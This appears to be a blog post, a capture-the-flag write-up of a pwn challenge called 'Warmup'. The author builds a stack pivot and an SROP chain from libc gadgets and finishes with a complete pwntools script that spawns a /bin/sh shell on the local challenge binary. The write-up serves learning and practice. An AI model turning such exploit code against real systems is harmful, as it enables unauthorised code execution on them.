@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PWN - Warmup | papichulo16</title>
+  <link rel="stylesheet" href="/assets/css/style.css">
+  
+</head>
+<body>
+  <nav class="navbar">
+    <a class="menu home-link" href="/"><img src="/assets/img/chavo.png" alt="El chavo" class="pfp-img">papichulo16</a>
+
+    <div class="nav-right">
+      <a href="https://github.com/papichulo16">Github</a>
+      <a href="/contact">Contact</a>
+      <a href="/reviews">Reviews</a>
+      <div class="dropdown">
+        <span><a href="/projects">Projects ▾</a></span>
+        <div class="dropdown-content">
+          
+            <a href="/projects/1_magical_kernel.html">Magical Kernel</a>
+          
+            <a href="/projects/2_crap.html">C.R.A.P</a>
+          
+            <a href="/projects/6_ctf_writeups.html">PWN Writeups</a>
+          
+        </div>
+      </div>
+    </div>
+  </nav>
+  <hr>
+
+  <main>
+    <article class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">PWN - Warmup</h1>
+  </header>
+
+  <div class="post-content">
+    <h2 id="pwn---warmup">PWN - Warmup</h2>
+
+<p>This challenge was really fun. It might have been easier for some more experienced people but I am fairly new and had a lot of headache near the end.</p>
+
+<p>This challenge started off fairly straight-forward since from first glance into the disassembly code you can see that it would be a stack pivot problem since it only gives you 16 bytes to work with.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">local_48</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  
+  <span class="n">helper</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">puts</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"name&gt;&gt; "</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"alright&gt;&gt; "</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">local_48</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"okey"</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So first off I thought I would write a ret2libc ROP chain into the “name” variable and then use the <code class="language-plaintext highlighter-rouge">pop rsp ; ret</code> gadget I found in the binary for a stack pivot.</p>
+
+<p>Now the only problem here is, there is only 512 allocated bytes into the <code class="language-plaintext highlighter-rouge">name</code> buffer, which will not be enough. But I didn’t know that until a few hours later when I realized the reason <code class="language-plaintext highlighter-rouge">system</code> was breaking was because it was setting the stack pointer way above where it was intended. Below is the assembler code before and at the point it breaks. Here you can see the stack pointer being set a long way further up and the point where the exploit breaks since it is trying to write into an unwriteable area in memory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x00007f4b0993f92e &lt;+46&gt;:    sub    rsp,0x388
+   0x00007f4b0993f935 &lt;+53&gt;:    mov    rax,QWORD PTR fs:0x28
+   0x00007f4b0993f93e &lt;+62&gt;:    mov    QWORD PTR [rsp+0x378],rax
+   0x00007f4b0993f946 &lt;+70&gt;:    xor    eax,eax
+=&gt; 0x00007f4b0993f948 &lt;+72&gt;:    mov    DWORD PTR [rsp+0x18],0xffffffff
+</code></pre></div></div>
+
+<h3 id="solution">Solution</h3>
+
+<p>So if there is not enough space to call <code class="language-plaintext highlighter-rouge">system</code> then I decided to create an SROP chain, using gadgets from libc. But first I must leak the libc PIE offset. Thankfully the challenge gives you the address of <code class="language-plaintext highlighter-rouge">puts</code> so the hard work is already done for you.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">puts</span> <span class="o">=</span> <span class="nb">int</span> <span class="p">(</span><span class="n">puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>I will also need to gather all the gadgets needed for this.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pop_rsp</span> <span class="o">=</span> <span class="n">p64</span> <span class="p">(</span><span class="mh">0x40118e</span><span class="p">)</span> <span class="c1"># push rbp ; mov rbp, rsp ; pop rsp ; ret
+</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">"pop rdi"</span><span class="p">,</span> <span class="s">"ret"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">"syscall"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">pop_rax</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">"pop rax"</span><span class="p">,</span> <span class="s">"ret"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="n">p64</span> <span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">))</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now with this I can create the SROP chain.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span> <span class="c1"># execve syscall
+</span><span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">))</span> <span class="o">+</span> <span class="n">offset</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span> <span class="o">+</span> <span class="n">offset</span>
+
+<span class="n">srop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>And now all I must do is pivot the stack into <code class="language-plaintext highlighter-rouge">name</code> with the overflow.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">target_buf_start</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404060</span><span class="p">)</span>
+
+<span class="n">overflow</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">64</span> <span class="o">+</span> <span class="n">target_buf_start</span> <span class="o">+</span> <span class="n">pop_rsp</span> <span class="o">+</span> <span class="n">target_buf_start</span>
+</code></pre></div></div>
+
+<h3 id="final-solution">Final solution</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span> <span class="p">(</span><span class="s">"./warmup"</span><span class="p">)</span>
+<span class="nb">file</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./warmup"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="p">)</span>
+
+
+<span class="c1"># GADGETS
+</span>
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+
+<span class="n">puts</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">puts</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+
+<span class="n">pop_rsp</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40118e</span><span class="p">)</span> <span class="c1"># push rbp ; mov rbp, rsp ; pop rsp ; ret
+</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">"pop rdi"</span><span class="p">,</span> <span class="s">"ret"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">"syscall"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">pop_rax</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">"pop rax"</span><span class="p">,</span> <span class="s">"ret"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="n">p64</span> <span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">))</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span>
+
+
+<span class="c1"># SROP
+</span>
+<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">))</span> <span class="o">+</span> <span class="n">offset</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span> <span class="o">+</span> <span class="n">offset</span>
+
+<span class="n">srop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+
+
+<span class="c1"># PIVOT SECTION
+</span>
+<span class="n">target_buf_start</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404060</span><span class="p">)</span>
+
+<span class="n">overflow</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">64</span> <span class="o">+</span> <span class="n">target_buf_start</span> <span class="o">+</span> <span class="n">pop_rsp</span> <span class="o">+</span> <span class="n">target_buf_start</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">srop</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">overflow</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </div>
+
+</article>
+
+  </main>
+
+  <footer>
+    <hr>
+    © 2025 papichulo16
+  </footer>
+</body>
+</html>
+
